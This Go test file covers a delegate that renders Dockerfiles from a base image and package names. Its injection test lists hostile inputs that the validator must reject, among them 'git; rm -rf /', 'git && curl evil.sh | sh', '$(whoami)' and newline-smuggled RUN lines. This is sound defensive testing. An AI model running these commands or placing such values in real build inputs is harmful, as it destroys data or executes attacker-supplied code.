package delegates

import (
	"encoding/binary"
	"strings"
	"testing"

	"github.com/JBailes/aimee/server-go/bus"
)

func imageSpecRequest(base string, packages []string, verbatim string) []byte {
	out := make([]byte, imageSpecReqHeaderLen)
	binary.LittleEndian.PutUint32(out[0:4], imageSpecRequestMagic)
	out[4] = wireVersion
	binary.LittleEndian.PutUint32(out[8:12], uint32(len(packages)))
	put := func(s string) {
		var n [4]byte
		binary.LittleEndian.PutUint32(n[:], uint32(len(s)))
		out = append(out, n[:]...)
		out = append(out, s...)
	}
	put(base)
	for _, p := range packages {
		put(p)
	}
	put(verbatim)
	return out
}

func callImageSpec(t *testing.T, base string, packages []string) (string, string, bus.ModuleStatus) {
	t.Helper()
	response, status := Handle(bus.ModuleInvocation{StageID: StageImageSpec},
		imageSpecRequest(base, packages, ""))
	if status != bus.ModuleStatusOK {
		return "", "", status
	}
	if len(response) < 12 || binary.LittleEndian.Uint32(response[0:4]) != imageSpecResponseMagic {
		t.Fatal("bad response header")
	}
	tagLen := int(binary.LittleEndian.Uint32(response[4:8]))
	dfLen := int(binary.LittleEndian.Uint32(response[8:12]))
	if 12+tagLen+dfLen != len(response) {
		t.Fatalf("response length %d does not match its header", len(response))
	}
	return string(response[12 : 12+tagLen]), string(response[12+tagLen:]), status
}

func TestImageSpecRendersPackages(t *testing.T) {
	tag, df, status := callImageSpec(t, "ubuntu:22.04", []string{"git", "curl", "build-essential"})
	if status != bus.ModuleStatusOK {
		t.Fatalf("status = %v", status)
	}
	if !strings.HasPrefix(df, "FROM ubuntu:22.04\n") {
		t.Errorf("dockerfile does not start with the base: %q", df)
	}
	if !strings.Contains(df, "git curl build-essential") {
		t.Errorf("packages missing from the dockerfile: %q", df)
	}
	// The apt lists are removed in the same layer, or the image carries them.
	if !strings.Contains(df, "rm -rf /var/lib/apt/lists/*") {
		t.Errorf("apt lists are not cleaned up: %q", df)
	}
	if tag == "" {
		t.Error("no tag returned")
	}
}

// No packages is just the base -- not an apt-get that installs nothing and
// still pays for a network round trip on every build.
func TestImageSpecWithNoPackagesIsJustTheBase(t *testing.T) {
	_, df, status := callImageSpec(t, "alpine:3", nil)
	if status != bus.ModuleStatusOK {
		t.Fatalf("status = %v", status)
	}
	if df != "FROM alpine:3\n" {
		t.Errorf("dockerfile = %q, want just the base", df)
	}
}

// The tag names the CONTENT, so identical content reuses an already-built image
// and different content cannot collide onto it.
func TestImageSpecTagFollowsTheContent(t *testing.T) {
	tagA, dfA, _ := callImageSpec(t, "ubuntu:22.04", []string{"git"})
	tagB, dfB, _ := callImageSpec(t, "ubuntu:22.04", []string{"git"})
	if tagA != tagB || dfA != dfB {
		t.Error("the same request produced a different tag, so nothing would ever be reused")
	}
	tagC, _, _ := callImageSpec(t, "ubuntu:22.04", []string{"git", "curl"})
	if tagA == tagC {
		t.Error("different package sets collided onto one tag")
	}
	tagD, _, _ := callImageSpec(t, "ubuntu:24.04", []string{"git"})
	if tagA == tagD {
		t.Error("different bases collided onto one tag")
	}
	if !strings.HasPrefix(tagA, sandboxTagPrefix) {
		t.Errorf("tag %q lost its prefix", tagA)
	}
}

// These names are interpolated into a Dockerfile that `docker build` executes,
// WITH a network. A rejected name yields nothing at all -- building a narrower
// image than was asked for would leave the delegate missing a tool with nothing
// to say why.
func TestImageSpecRefusesInjection(t *testing.T) {
	bad := [][]string{
		{"git; rm -rf /"},
		{"git && curl evil.sh | sh"},
		{"$(whoami)"},
		{"`id`"},
		{"git\nRUN echo pwned"},
		{"--allow-downgrades"},
		{""},
	}
	for _, pkgs := range bad {
		if _, _, status := callImageSpec(t, "ubuntu:22.04", pkgs); status != bus.ModuleStatusInvalidRequest {
			t.Errorf("packages %q: status = %v, want InvalidRequest", pkgs, status)
		}
	}
	for _, base := range []string{
		"", "ubuntu:22.04; rm -rf /", "ubuntu$(id)", "ubuntu:22.04\nRUN evil",
	} {
		if _, _, status := callImageSpec(t, base, nil); status != bus.ModuleStatusInvalidRequest {
			t.Errorf("base %q: status = %v, want InvalidRequest", base, status)
		}
	}
}

func TestImageSpecAcceptsRealNames(t *testing.T) {
	for _, pkgs := range [][]string{
		{"build-essential"}, {"python3.11"}, {"lib32z1"}, {"g++"}, {"ca-certificates"},
	} {
		if _, _, status := callImageSpec(t, "ubuntu:22.04", pkgs); status != bus.ModuleStatusOK {
			t.Errorf("packages %q were refused", pkgs)
		}
	}
	for _, base := range []string{
		"ubuntu:22.04", "docker.io/library/ubuntu:22.04", "ghcr.io/org/img:v1.2.3",
	} {
		if _, _, status := callImageSpec(t, base, nil); status != bus.ModuleStatusOK {
			t.Errorf("base %q was refused", base)
		}
	}
}

func TestImageSpecRejectsMalformedRequests(t *testing.T) {
	good := imageSpecRequest("ubuntu:22.04", []string{"git"}, "")

	cases := map[string][]byte{
		"empty":         {},
		"short header":  good[:8],
		"trailing byte": append(append([]byte{}, good...), 0),
		"truncated":     good[:len(good)-1],
	}
	badMagic := append([]byte{}, good...)
	binary.LittleEndian.PutUint32(badMagic[0:4], 0xDEADBEEF)
	cases["wrong magic"] = badMagic

	badVersion := append([]byte{}, good...)
	badVersion[4] = wireVersion + 1
	cases["wrong version"] = badVersion

	tooMany := append([]byte{}, good...)
	binary.LittleEndian.PutUint32(tooMany[8:12], imageSpecMaxPackages+1)
	cases["package count over the bound"] = tooMany

	overrun := append([]byte{}, good...)
	binary.LittleEndian.PutUint32(overrun[imageSpecReqHeaderLen:imageSpecReqHeaderLen+4], 1<<20)
	cases["base length overruns"] = overrun

	for name, request := range cases {
		if _, status := Handle(bus.ModuleInvocation{StageID: StageImageSpec}, request); status != bus.ModuleStatusInvalidRequest {
			t.Errorf("%s: status = %v, want InvalidRequest", name, status)
		}
	}
}

func TestImageSpecHonoursCancellation(t *testing.T) {
	invocation := bus.ModuleInvocation{StageID: StageImageSpec, DeadlineNS: 1}
	if _, status := Handle(invocation, imageSpecRequest("ubuntu:22.04", nil, "")); status != bus.ModuleStatusCancelled {
		t.Errorf("status = %v, want Cancelled", status)
	}
}

// A Dockerfile the operator committed is carried whole and named here. Naming
// it anywhere else would put the tag's shape in two places, and the same
// content would resolve to two names -- so nothing would ever be reused.
func TestImageSpecTagsAVerbatimDockerfile(t *testing.T) {
	df := "FROM ubuntu:22.04\nRUN echo hand-written\n"
	response, status := Handle(bus.ModuleInvocation{StageID: StageImageSpec},
		imageSpecRequest("", nil, df))
	if status != bus.ModuleStatusOK {
		t.Fatalf("status = %v", status)
	}
	tagLen := int(binary.LittleEndian.Uint32(response[4:8]))
	gotTag := string(response[12 : 12+tagLen])
	gotDF := string(response[12+tagLen:])
	if gotDF != df {
		t.Errorf("the dockerfile came back altered: %q", gotDF)
	}
	if gotTag != SandboxContentTag(df) {
		t.Errorf("tag %q does not name the content", gotTag)
	}
}

// Two descriptions of one image is a question with no right answer, so it is
// refused rather than resolved in favour of either.
func TestImageSpecRefusesBothFormsAtOnce(t *testing.T) {
	_, status := Handle(bus.ModuleInvocation{StageID: StageImageSpec},
		imageSpecRequest("ubuntu:22.04", []string{"git"}, "FROM alpine:3\n"))
	if status != bus.ModuleStatusInvalidRequest {
		t.Errorf("status = %v, want InvalidRequest", status)
	}
}
